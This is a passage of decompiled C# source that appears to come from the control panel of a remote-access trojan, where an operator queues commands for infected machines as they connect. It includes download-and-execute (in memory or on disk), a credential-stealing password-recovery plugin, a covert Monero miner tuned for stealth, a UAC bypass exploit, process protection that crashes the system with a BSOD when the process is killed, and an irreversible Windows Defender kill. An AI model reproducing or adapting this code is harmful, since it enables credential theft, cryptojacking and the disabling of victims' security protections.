			Interaction.MsgBox("Invalid amount of minutes!\r\nAllowed range is 0 to 1440 minutes.", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		ListViewItem listViewItem = new ListViewItem();
		listViewItem.Tag = Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("dlexec|", Interaction.IIf(this.vmethod_14().Checked, "0", "1")), "|"), this.vmethod_12().Text);
		listViewItem.Text = "Download & Execute";
		if (this.vmethod_14().Checked)
		{
			listViewItem.SubItems.Add("Execute: " + this.vmethod_12().Text + " in memory");
		}
		else
		{
			listViewItem.SubItems.Add("Execute: " + this.vmethod_12().Text + " on disk");
		}
		listViewItem.SubItems.Add(Conversions.ToString(Conversion.Val(text2)));
		listViewItem.SubItems.Add("0");
		this.vmethod_8().Items.Add(listViewItem);
		this.method_20();
	}

	// Token: 0x06000B3E RID: 2878 RVA: 0x00057BDC File Offset: 0x00055DDC
	private void method_1(object sender, EventArgs e)
	{
		if (!File.Exists(Application.StartupPath + "\\data\\plugins\\pws.plg"))
		{
			Interaction.MsgBox("Plugin not found! Please make sure: " + Application.StartupPath + "\\data\\plugins\\pws.plg exists.", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		string text = Interaction.InputBox("Enter delay in minutes (Use 0 for instant)", Application.ProductName, string.Empty, -1, -1);
		if (!Versioned.IsNumeric(text) | Conversion.Val(text) > 1440.0)
		{
			Interaction.MsgBox("Invalid amount of minutes!\r\nAllowed range is 0 to 1440 minutes.", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		string text2 = Application.StartupPath + "\\data\\plugins\\pws.plg";
		string str = Class136.smethod_29(ref text2);
		Class130.fCredentialsLogins_0.Visible = true;
		ListViewItem listViewItem = new ListViewItem();
		if (!Class135.smethod_0().PluginsUpload)
		{
			if (Class135.smethod_0().PluginsURLPws.Length < 8 | !Class135.smethod_0().PluginsURLPws.Contains("://") | !Class135.smethod_0().PluginsURLPws.Contains("http") | !Class135.smethod_0().PluginsURLPws.Contains(".") | Operators.CompareString(Class135.smethod_0().PluginsURLPws, "URL to plugin: http://site.com/pws.plg", true) == 0)
			{
				Interaction.MsgBox("URL to plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
				Class130.fSettings_0.Visible = true;
				Class130.fSettings_0.Activate();
				Class130.fSettings_0.vmethod_44().BackColor = Color.Red;
				return;
			}
			listViewItem.Tag = "crd_logins_report|" + str + "|" + Class135.smethod_0().PluginsURLPws;
			listViewItem.Text = "Password recovery";
			listViewItem.SubItems.Add("Plugin will be downloaded");
			listViewItem.SubItems.Add(Conversions.ToString(Conversion.Val(text)));
			listViewItem.SubItems.Add("0");
		}
		else
		{
			listViewItem.Tag = "crd_logins_report_req|" + str;
			listViewItem.Text = "Password recovery";
			listViewItem.SubItems.Add("Plugin will be uploaded");
			listViewItem.SubItems.Add(Conversions.ToString(Conversion.Val(text)));
			listViewItem.SubItems.Add("0");
		}
		this.vmethod_8().Items.Add(listViewItem);
		this.method_20();
	}

	// Token: 0x06000B3F RID: 2879 RVA: 0x00007320 File Offset: 0x00005520
	private void method_2(object sender, EventArgs e)
	{
		Interaction.MsgBox("It's recommended to leave the number of threads to auto, especially when mining from several clients with different PC specifications.\r\nIf auto is selected, the miner will use as many threads as possible for optimal mining performance and typically consume about 50% of CPU power in average.\r\nBy setting a value for threads, like 16, will consume about 100% from CPUs having 8 cores and cause stuttering/lag on waker CPUs.\r\nIf being stealth is more valued, then it's recommended to use a low number for threads at the cost of reduced hash rate.\r\nI.e. 2-4 threads may be prefered and should consume between 25-50% of CPU power.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000B40 RID: 2880 RVA: 0x00007334 File Offset: 0x00005534
	private void method_3(object sender, EventArgs e)
	{
		Interaction.MsgBox("If enabled, the 64-Bit version of the XMR miner will be used, which offers a much higher hashrate.\r\n\r\nNote: This plugin is only supported on 64-Bit editions of Windows.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000B41 RID: 2881 RVA: 0x00057E24 File Offset: 0x00056024
	private void method_4(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_34().Text, "(Optional)", true) == 0)
		{
			this.vmethod_34().Text = string.Empty;
			this.vmethod_34().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_34().Font, FontStyle.Regular);
			this.vmethod_34().Font = font;
		}
	}

	// Token: 0x06000B42 RID: 2882 RVA: 0x00057E88 File Offset: 0x00056088
	private void method_5(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_34().Text, string.Empty, true) == 0)
		{
			this.vmethod_34().Text = "(Optional)";
			this.vmethod_34().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_34().Font, FontStyle.Italic);
			this.vmethod_34().Font = font;
		}
	}

	// Token: 0x06000B43 RID: 2883 RVA: 0x00057EEC File Offset: 0x000560EC
	private void method_6(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_28().Text, string.Empty, true) == 0)
		{
			this.vmethod_28().Text = "(Optional)";
			this.vmethod_28().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_28().Font, FontStyle.Italic);
			this.vmethod_28().Font = font;
		}
	}

	// Token: 0x06000B44 RID: 2884 RVA: 0x00057F50 File Offset: 0x00056150
	private void method_7(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_28().Text, "(Optional)", true) == 0)
		{
			this.vmethod_28().Text = string.Empty;
			this.vmethod_28().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_28().Font, FontStyle.Regular);
			this.vmethod_28().Font = font;
		}
	}

	// Token: 0x06000B45 RID: 2885 RVA: 0x00057FB4 File Offset: 0x000561B4
	private void method_8(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_66().Text, "example-pool.com:5555", true) == 0)
		{
			this.vmethod_66().Text = string.Empty;
			this.vmethod_66().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_66().Font, FontStyle.Regular);
			this.vmethod_66().Font = font;
		}
	}

	// Token: 0x06000B46 RID: 2886 RVA: 0x00058018 File Offset: 0x00056218
	private void method_9(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_66().Text, string.Empty, true) == 0)
		{
			this.vmethod_66().Text = "example-pool.com:5555";
			this.vmethod_66().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_66().Font, FontStyle.Italic);
			this.vmethod_66().Font = font;
		}
	}

	// Token: 0x06000B47 RID: 2887 RVA: 0x0005807C File Offset: 0x0005627C
	private void method_10(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_48().Text, string.Empty, true) == 0)
		{
			this.vmethod_48().Text = "(Optional)";
			this.vmethod_48().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_48().Font, FontStyle.Italic);
			this.vmethod_48().Font = font;
		}
	}

	// Token: 0x06000B48 RID: 2888 RVA: 0x000580E0 File Offset: 0x000562E0
	private void method_11(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_48().Text, "(Optional)", true) == 0)
		{
			this.vmethod_48().Text = string.Empty;
			this.vmethod_48().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_48().Font, FontStyle.Regular);
			this.vmethod_48().Font = font;
		}
	}

	// Token: 0x06000B49 RID: 2889 RVA: 0x00058144 File Offset: 0x00056344
	private void method_12(object sender, EventArgs e)
	{
		this.vmethod_62().BringToFront();
		this.vmethod_62().Width = checked(this.vmethod_28().Left + this.vmethod_28().Width - this.vmethod_62().Left);
		this.vmethod_62().Anchor = (AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right);
		if (Operators.CompareString(this.vmethod_62().Text, "Username/wallet address", true) == 0)
		{
			this.vmethod_62().Text = string.Empty;
			this.vmethod_62().ForeColor = Color.Black;
			Font font = new Font(this.vmethod_62().Font, FontStyle.Regular);
			this.vmethod_62().Font = font;
		}
	}

	// Token: 0x06000B4A RID: 2890 RVA: 0x000581F0 File Offset: 0x000563F0
	private void method_13(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.vmethod_62().Text, string.Empty, true) == 0)
		{
			this.vmethod_62().Text = "Username/wallet address";
			this.vmethod_62().ForeColor = Color.Gray;
			Font font = new Font(this.vmethod_62().Font, FontStyle.Italic);
			this.vmethod_62().Font = font;
		}
		this.vmethod_62().Width = this.vmethod_66().Width;
		this.vmethod_62().Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
	}

	// Token: 0x06000B4B RID: 2891 RVA: 0x00058278 File Offset: 0x00056478
	private void method_14(object sender, EventArgs e)
	{
		string text = string.Empty;
		string text2 = string.Empty;
		string text3 = string.Empty;
		string text4 = string.Empty;
		string text5 = string.Empty;
		string text6 = string.Empty;
		string text7 = string.Empty;
		string text8 = string.Empty;
		string text9 = string.Empty;
		object objectValue = RuntimeHelpers.GetObjectValue(Interaction.IIf(this.vmethod_26().Checked, Application.StartupPath + "\\data\\plugins\\xmr64.plg", Application.StartupPath + "\\data\\plugins\\xmr.plg"));
		if (!File.Exists(Conversions.ToString(objectValue)))
		{
			Interaction.MsgBox(Operators.ConcatenateObject(Operators.ConcatenateObject("Plugin not found! Please make sure: ", objectValue), " exists."), MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		if (!Class135.smethod_0().PluginsUpload && (Class135.smethod_0().PluginsURLXMR.Length < 8 | !Class135.smethod_0().PluginsURLXMR.Contains("://") | !Class135.smethod_0().PluginsURLXMR.Contains("http") | !Class135.smethod_0().PluginsURLXMR.Contains(".") | Operators.CompareString(Class135.smethod_0().PluginsURLXMR, "URL to plugin: http://site.com/xmr.plg", true) == 0))
		{
			Interaction.MsgBox("URL to XMR Miner plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
			Class130.fSettings_0.Visible = true;
			Class130.fSettings_0.Activate();
			Class130.fSettings_0.vmethod_6().SelectedIndex = 2;
			Class130.fSettings_0.vmethod_42().Select();
			Class130.fSettings_0.vmethod_42().BackColor = Color.Red;
			return;
		}
		if (this.vmethod_66().Text.Length < 5 | !this.vmethod_66().Text.Contains(":") | Operators.CompareString(this.vmethod_66().Text, "example-pool.com:5555", true) == 0)
		{
			Interaction.MsgBox("Invalid Pool/URL of mining server!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		if (this.vmethod_62().Text.Length < 1 | Operators.CompareString(this.vmethod_62().Text, "Username/wallet address", true) == 0)
		{
			Interaction.MsgBox("Invalid Username!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		string text10 = Interaction.InputBox("Enter delay in minutes (Use 0 for instant)", Application.ProductName, string.Empty, -1, -1);
		if (!Versioned.IsNumeric(text10) | Conversion.Val(text10) > 1440.0)
		{
			Interaction.MsgBox("Invalid amount of minutes!\r\nAllowed range is 0 to 1440 minutes.", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		if (this.vmethod_54().SelectedIndex > 0)
		{
			text = " --threads " + this.vmethod_54().SelectedItem.ToString();
		}
		if (this.vmethod_44().SelectedIndex > 0)
		{
			text8 = " --donate-level=" + this.vmethod_44().SelectedItem.ToString();
		}
		if (this.vmethod_48().Text.Length > 0 & Operators.CompareString(this.vmethod_48().Text, "(Optional)", true) != 0)
		{
			text3 = " -u " + this.vmethod_48().Text;
		}
		if (this.vmethod_34().Text.Length > 0 & Operators.CompareString(this.vmethod_34().Text, "(Optional)", true) != 0)
		{
			text9 = " --user-agent \"" + this.vmethod_34().Text + "\"";
		}
		if (this.vmethod_28().Text.Length > 0 & Operators.CompareString(this.vmethod_28().Text, "(Optional)", true) != 0)
		{
			string text11 = this.vmethod_28().Text;
		}
		if (this.vmethod_52().Checked)
		{
			text4 = " --nicehash";
		}
		if (this.vmethod_42().Checked)
		{
			text5 = " --keepalive";
		}
		if (this.vmethod_32().Checked)
		{
			text6 = " --no-huge-pages";
		}
		text7 = " -u " + this.vmethod_62().Text;
		text2 = " -a " + this.vmethod_58().SelectedItem.ToString();
		if (this.vmethod_38().SelectedIndex != 3)
		{
			switch (this.vmethod_38().SelectedIndex)
			{
			}
		}
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			using (MD5 md = MD5.Create())
			{
				byte[] array = md.ComputeHash(File.ReadAllBytes(Conversions.ToString(objectValue)));
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					stringBuilder.Append(array[i].ToString("X2"));
				}
			}
			StringBuilder stringBuilder2 = new StringBuilder();
			if (this.vmethod_26().Checked)
			{
				using (MD5 md2 = MD5.Create())
				{
					byte[] array2 = md2.ComputeHash(File.ReadAllBytes(Application.StartupPath + "\\data\\plugins\\loader.plg"));
					int num2 = array2.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						stringBuilder2.Append(array2[j].ToString("X2"));
					}
				}
			}
			ListViewItem listViewItem = new ListViewItem();
			listViewItem.Text = "XMR Miner";
			if (!Class135.smethod_0().PluginsUpload)
			{
				if (this.vmethod_26().Checked)
				{
					listViewItem.Tag = string.Concat(new string[]
					{
						"xmr64_mine_start|",
						stringBuilder.ToString().ToLower(),
						"|",
						Class135.smethod_0().PluginsURLXMR64,
						"|",
						stringBuilder2.ToString().ToLower(),
						"|",
						Class135.smethod_0().PluginsURLLoader,
						"|",
						text,
						text2,
						" -o ",
						this.vmethod_66().Text,
						text7,
						text3,
						text4,
						text5,
						text6,
						text8,
						text9
					});
					listViewItem.SubItems.Add("Mining for " + this.vmethod_66().Text + " (64-bit)");
				}
				else
				{
					listViewItem.Tag = string.Concat(new string[]
					{
						"xmr64_mine_start|",
						stringBuilder.ToString().ToLower(),
						"|",
						Class135.smethod_0().PluginsURLXMR,
						"|",
						text,
						text2,
						" -o ",
						this.vmethod_66().Text,
						text7,
						text3,
						text4,
						text5,
						text6,
						text8,
						text9
					});
					listViewItem.SubItems.Add("Mining for " + this.vmethod_66().Text + " (32-bit)");
				}
			}
			else if (this.vmethod_26().Checked)
			{
				listViewItem.Tag = string.Concat(new string[]
				{
					"xmr64_mine_req|",
					stringBuilder.ToString().ToLower(),
					"|",
					Class135.smethod_0().PluginsURLXMR64,
					"|",
					stringBuilder2.ToString().ToLower(),
					"|",
					Class135.smethod_0().PluginsURLLoader,
					"|",
					text,
					text2,
					" -o ",
					this.vmethod_66().Text,
					text7,
					text3,
					text4,
					text5,
					text6,
					text8,
					text9
				});
				listViewItem.SubItems.Add("Mining for " + this.vmethod_66().Text + " (64-bit)");
			}
			else
			{
				listViewItem.Tag = string.Concat(new string[]
				{
					"xmr64_mine_req|",
					stringBuilder.ToString().ToLower(),
					"|",
					Class135.smethod_0().PluginsURLXMR,
					"|",
					text,
					text2,
					" -o ",
					this.vmethod_66().Text,
					text7,
					text3,
					text4,
					text5,
					text6,
					text8,
					text9
				});
				listViewItem.SubItems.Add("Mining for " + this.vmethod_66().Text + " (32-bit)");
			}
			listViewItem.SubItems.Add(Conversions.ToString(Conversion.Val(text10)));
			listViewItem.SubItems.Add("0");
			this.vmethod_8().Items.Add(listViewItem);
			this.method_20();
		}
	}

	// Token: 0x06000B4C RID: 2892 RVA: 0x00007348 File Offset: 0x00005548
	private void fOnJoin_Closing(object sender, CancelEventArgs e)
	{
		base.Visible = false;
		e.Cancel = true;
	}

	// Token: 0x06000B4D RID: 2893 RVA: 0x00058B6C File Offset: 0x00056D6C
	private void method_15(object sender, EventArgs e)
	{
		checked
		{
			if (MessageBox.Show("Are you sure you want to remove the selected command(s)?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
			{
				GClass7 gclass = this.vmethod_8();
				for (;;)
				{
					IL_4C:
					int num = gclass.Items.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						if (gclass.Items[i].Selected)
						{
							gclass.Items[i].Remove();
							goto IL_4C;
						}
					}
					break;
				}
				this.method_20();
			}
		}
	}

	// Token: 0x06000B4E RID: 2894 RVA: 0x00058BE0 File Offset: 0x00056DE0
	private void method_16(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			if (this.vmethod_8().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_8();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					if (gclass.Items[i].Selected)
					{
						stringBuilder.Append(gclass.Items[i].Text);
						int num2 = gclass.Columns.Count - 1;
						for (int j = 1; j <= num2; j++)
						{
							stringBuilder.Append("\t" + gclass.Items[i].SubItems[j].Text);
						}
						stringBuilder.Append("\r\n");
					}
				}
				if (stringBuilder.Length > 0)
				{
					string text = stringBuilder.ToString();
					Clipboard.Clear();
					Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x06000B4F RID: 2895 RVA: 0x00058CDC File Offset: 0x00056EDC
	private void method_17(object sender, EventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			if (this.vmethod_8().Items.Count != 0)
			{
				GClass7 gclass = this.vmethod_8();
				int num = gclass.Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					stringBuilder.Append(gclass.Items[i].Text);
					int num2 = gclass.Columns.Count - 1;
					for (int j = 1; j <= num2; j++)
					{
						stringBuilder.Append("\t" + gclass.Items[i].SubItems[j].Text);
					}
					stringBuilder.Append("\r\n");
				}
				if (stringBuilder.Length > 0)
				{
					string text = stringBuilder.ToString();
					Clipboard.Clear();
					Clipboard.SetText(text.Remove(text.LastIndexOf("\r\n")));
				}
			}
		}
	}

	// Token: 0x06000B50 RID: 2896 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_18(object sender, EventArgs e)
	{
	}

	// Token: 0x06000B51 RID: 2897 RVA: 0x00058DC0 File Offset: 0x00056FC0
	private void method_19(object sender, EventArgs e)
	{
		ListViewItem listViewItem = new ListViewItem();
		string text = Interaction.InputBox("Enter delay in minutes (Use 0 for instant)", Application.ProductName, string.Empty, -1, -1);
		if (!Versioned.IsNumeric(text) | Conversion.Val(text) > 1440.0)
		{
			Interaction.MsgBox("Invalid amount of minutes!\r\nAllowed range is 0 to 1440 minutes.", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		listViewItem.Tag = "uac_bypass|1";
		listViewItem.Text = "UAC Bypass";
		listViewItem.SubItems.Add("Attempt to gain administrative privileges by means of bypassing UAC (Exploit)");
		listViewItem.SubItems.Add(Conversions.ToString(Conversion.Val(text)));
		listViewItem.SubItems.Add("0");
		this.vmethod_8().Items.Add(listViewItem);
		this.method_20();
	}

	// Token: 0x06000B52 RID: 2898 RVA: 0x00058E84 File Offset: 0x00057084
	private void method_20()
	{
		ArrayList arrayList = new ArrayList();
		GClass7 gclass = this.vmethod_8();
		checked
		{
			int num = gclass.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				Strings.Split(Conversions.ToString(gclass.Items[i].Tag), "|", -1, CompareMethod.Text);
				arrayList.Add(Operators.ConcatenateObject(string.Concat(new string[]
				{
					gclass.Items[i].Text,
					"|",
					gclass.Items[i].SubItems[1].Text,
					"|",
					gclass.Items[i].SubItems[2].Text,
					"|"
				}), gclass.Items[i].Tag));
			}
			Class135.smethod_0().OnJoinCommands = arrayList;
			Class135.smethod_0().Save();
		}
	}

	// Token: 0x06000B53 RID: 2899 RVA: 0x00007358 File Offset: 0x00005558
	private void method_21(object sender, EventArgs e)
	{
		if (MessageBox.Show("Are you sure you want clear all commands?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			this.vmethod_8().Items.Clear();
			this.method_20();
		}
	}

	// Token: 0x06000B54 RID: 2900 RVA: 0x00058F8C File Offset: 0x0005718C
	private void method_22(object sender, EventArgs e)
	{
		ListViewItem listViewItem = new ListViewItem();
		string text = Interaction.InputBox("Enter delay in minutes (Use 0 for instant)", Application.ProductName, string.Empty, -1, -1);
		if (!Versioned.IsNumeric(text) | Conversion.Val(text) > 1440.0)
		{
			Interaction.MsgBox("Invalid amount of minutes!\r\nAllowed range is 0 to 1440 minutes.", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		listViewItem.Tag = "prc_protect|1";
		listViewItem.Text = "Protect process";
		listViewItem.SubItems.Add("Attempt to protect process (trigger BSOD on terminate)");
		listViewItem.SubItems.Add(Conversions.ToString(Conversion.Val(text)));
		listViewItem.SubItems.Add("0");
		this.vmethod_8().Items.Add(listViewItem);
		this.method_20();
	}

	// Token: 0x06000B55 RID: 2901 RVA: 0x00059050 File Offset: 0x00057250
	private void method_23(object sender, EventArgs e)
	{
		ListViewItem listViewItem = new ListViewItem();
		if (MessageBox.Show("This will attempt to gain administrative privileges by means of bypassing UAC on Windows 10 systems and kill Windows Defender.\r\n\r\nWARNING: THIS ACTION IS IRREVERSIBLE!\r\n" + Application.ProductName + " WILL NOT BE ABLE TO RESTORE WINDOWS DEFENDER ONCE KILLED.\r\n\r\nAre you sure you wish to proceed?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.No)
		{
			string text = Interaction.InputBox("Enter delay in minutes (Use 0 for instant)", Application.ProductName, string.Empty, -1, -1);
			if (!Versioned.IsNumeric(text) | Conversion.Val(text) > 1440.0)
			{
				Interaction.MsgBox("Invalid amount of minutes!\r\nAllowed range is 0 to 1440 minutes.", MsgBoxStyle.Exclamation, Application.ProductName);
				return;
			}
			listViewItem.Tag = "wd_kill|1";
			listViewItem.Text = "Kill Windows Defender";
			listViewItem.SubItems.Add("Attempt to kill Windows Defender");
			listViewItem.SubItems.Add(Conversions.ToString(Conversion.Val(text)));
			listViewItem.SubItems.Add("0");
			this.vmethod_8().Items.Add(listViewItem);
			this.method_20();
		}
	}

	// Token: 0x04000418 RID: 1048
	private TabPage tabPage_0;

	// Token: 0x04000419 RID: 1049
	private TabPage tabPage_1;

	// Token: 0x0400041A RID: 1050
	private TabPage tabPage_2;

	// Token: 0x0400041B RID: 1051
	private TabControl tabControl_0;

	// Token: 0x0400041C RID: 1052
	private GClass7 gclass7_0;

	// Token: 0x0400041D RID: 1053
	private Label label_0;

	// Token: 0x0400041E RID: 1054
	private TextBox textBox_0;

	// Token: 0x0400041F RID: 1055
	private CheckBox checkBox_0;

	// Token: 0x04000420 RID: 1056
	private VisualButton visualButton_0;

	// Token: 0x04000421 RID: 1057
	private VisualButton visualButton_1;

	// Token: 0x04000422 RID: 1058
	private VisualButton visualButton_2;

	// Token: 0x04000423 RID: 1059
	private PictureBox pictureBox_0;

	// Token: 0x04000424 RID: 1060
	private PictureBox pictureBox_1;

	// Token: 0x04000425 RID: 1061
	private CheckBox checkBox_1;

	// Token: 0x04000426 RID: 1062
	private TextBox textBox_1;

	// Token: 0x04000427 RID: 1063
	private Label label_1;

	// Token: 0x04000428 RID: 1064
	private CheckBox checkBox_2;

	// Token: 0x04000429 RID: 1065
	private TextBox textBox_2;

	// Token: 0x0400042A RID: 1066
	private Label label_2;

	// Token: 0x0400042B RID: 1067
	private ComboBox comboBox_0;

	// Token: 0x0400042C RID: 1068
	private Label label_3;

	// Token: 0x0400042D RID: 1069
	private CheckBox checkBox_3;

	// Token: 0x0400042E RID: 1070
	private ComboBox comboBox_1;

	// Token: 0x0400042F RID: 1071
	private Label label_4;

	// Token: 0x04000430 RID: 1072
	private TextBox textBox_3;

	// Token: 0x04000431 RID: 1073
	private Label label_5;

	// Token: 0x04000432 RID: 1074
	private CheckBox checkBox_4;

	// Token: 0x04000433 RID: 1075
	private ComboBox comboBox_2;

	// Token: 0x04000434 RID: 1076
	private Label label_6;

	// Token: 0x04000435 RID: 1077
	private ComboBox comboBox_3;

	// Token: 0x04000436 RID: 1078
	private Label label_7;

	// Token: 0x04000437 RID: 1079
	private TextBox textBox_4;

	// Token: 0x04000438 RID: 1080
	private Label label_8;

	// Token: 0x04000439 RID: 1081
	private TextBox textBox_5;

	// Token: 0x0400043A RID: 1082
	private Label label_9;

	// Token: 0x0400043B RID: 1083
	private ContextMenuStrip contextMenuStrip_0;

	// Token: 0x0400043C RID: 1084
	private ToolStripMenuItem toolStripMenuItem_0;

	// Token: 0x0400043D RID: 1085
	private ToolStripSeparator toolStripSeparator_0;

	// Token: 0x0400043E RID: 1086
	private ToolStripMenuItem toolStripMenuItem_1;

	// Token: 0x0400043F RID: 1087
	private ToolStripMenuItem toolStripMenuItem_2;

	// Token: 0x04000440 RID: 1088
	private ToolStripSeparator toolStripSeparator_1;

	// Token: 0x04000441 RID: 1089
	private ToolStripMenuItem toolStripMenuItem_3;

	// Token: 0x04000442 RID: 1090
	private TabPage tabPage_3;

	// Token: 0x04000443 RID: 1091
	private VisualButton visualButton_3;

	// Token: 0x04000444 RID: 1092
	private ToolStripMenuItem toolStripMenuItem_4;

	// Token: 0x04000445 RID: 1093
	private TabPage tabPage_4;

	// Token: 0x04000446 RID: 1094
	private VisualButton visualButton_4;

	// Token: 0x04000447 RID: 1095
	private TabPage tabPage_5;

	// Token: 0x04000448 RID: 1096
	private VisualButton visualButton_5;
}
